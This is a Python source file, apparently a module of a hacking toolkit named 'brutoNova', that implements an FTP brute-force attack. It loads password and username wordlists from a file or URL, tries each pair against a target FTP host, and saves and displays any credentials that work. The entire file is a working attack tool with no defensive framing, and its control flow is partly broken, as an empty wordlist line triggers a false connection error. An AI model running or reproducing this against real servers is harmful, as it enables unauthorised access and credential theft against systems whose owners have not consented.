#!/usr/bin/python3

import sys, os, time
import socket
from ftplib import FTP
from urllib.request import urlopen
from modules.stylesheet.Styling import bc, sd
banner, sBan, eBan, iBan = sd.banner.logo, sd.sBan, sd.eBan, sd.iBan
from modules.database.md5_db import hash_db_MD5

class ftpBrute:
	def __init__(self, host, user):
		self.host = host
		self.user = user
		self.md5db = hash_db_MD5()
		
	def bruteForce(self, wordlist, wopt, unameWordlist):
		self.wordlist = wordlist
		self.option = wopt
		self.unameWordlist = unameWordlist
		self.usernames = []

		try:
			if(self.option == '1'):
				try:
					passwords = str(urlopen(self.wordlist).read(), 'utf-8')
				except Exception:
					os.system('clear')
					print(banner)
					print(eBan + ' ERROR: ' + bc.BC + 'Failed to open ' + bc.RC + self.wordlist + '\n')
					from brutoNova import brutoNova
					brutoNova()
			else:
				try:
					passwords = open(self.wordlist).read()
				except Exception:
					os.system('clear')
					print(banner)
					print(eBan + ' ERROR: ' + bc.BC + 'Failed to open ' + bc.RC + self.wordlist + '\n')
					input(bc.BC + " Press Enter to Continue...\n")
					from brutoNova import brutoNova
					brutoNova()
			
			if(self.unameWordlist != ''):
				try:
					unames = open(self.unameWordlist).read()
				except Exception:
					os.system('clear')
					print(banner)
					print(eBan + ' ERROR: ' + bc.BC + 'Failed to open ' + bc.RC + self.unameWordlist + '\n')
					input(bc.BC + " Press Enter to Continue...\n")
					from brutoNova import brutoNova
					brutoNova()
				
				for uname in unames.split('\n'):
					if(uname != ''):
						self.usernames.append(uname)
					else:
						continue
			else:
				self.usernames.append(self.user)
			
			for user in self.usernames:
				print(bc.BC + '\n Connecting to ' + bc.GC + self.host)
				for password in passwords.split('\n'):
					if(password != ''):
						try:
							server = FTP(self.host, passwd=password, timeout=10, encoding='utf-8')
						except socket.timeout:
							os.system('clear')
							print(banner)
							print(eBan + bc.RC + ' ERROR: ' + bc.BC + ' Host timed out: ' + bc.RC + self.host)
							input(bc.BC + '\n Press Enter to Continue...\n')
							from brutoNova import brutoNova
							brutoNova()
						except ConnectionResetError:
							os.system('clear')
							print(banner)
							print(eBan + bc.RC + ' ERROR: ' + bc.BC + 'Connection reset by host')
							input(bc.BC + '\n Press Enter to Continue...\n')
							from brutoNova import brutoNova
							brutoNova()

						print(bc.BC + ' Trying password: ' + bc.RC + password + bc.BC + ' for ' + bc.RC + user)
						try:
							login = server.login(user, password)
						except Exception:
							continue
						
						if(login):
							self.md5db.addFTPCreds(self.host, user, password)
							os.system('clear')
							print(banner)
							print(sBan + ' Credentials Found')
							print(bc.BC + ' \tHost: ' + bc.GC + self.host)
							print(bc.BC + ' \tUser: ' + bc.GC + user)
							print(bc.BC + ' \tPassword: ' + bc.GC + password + '\n')
							input(bc.BC + ' Press Enter to Continue...\n')
							from brutoNova import brutoNova
							brutoNova()
						else:
							continue
					else:
						os.system('clear')
						print(banner)
						print(eBan + bc.RC + ' ERROR: ' + bc.BC + 'Failed to connect to ' + bc.RC + self.host)
						input(bc.BC + '\n Press Enter to Continue...\n')
						from brutoNova import brutoNova
						brutoNova()
				else:
					continue
		except KeyboardInterrupt:
			os.system('clear')
			print(banner)
			from brutoNova import brutoNova
			brutoNova()
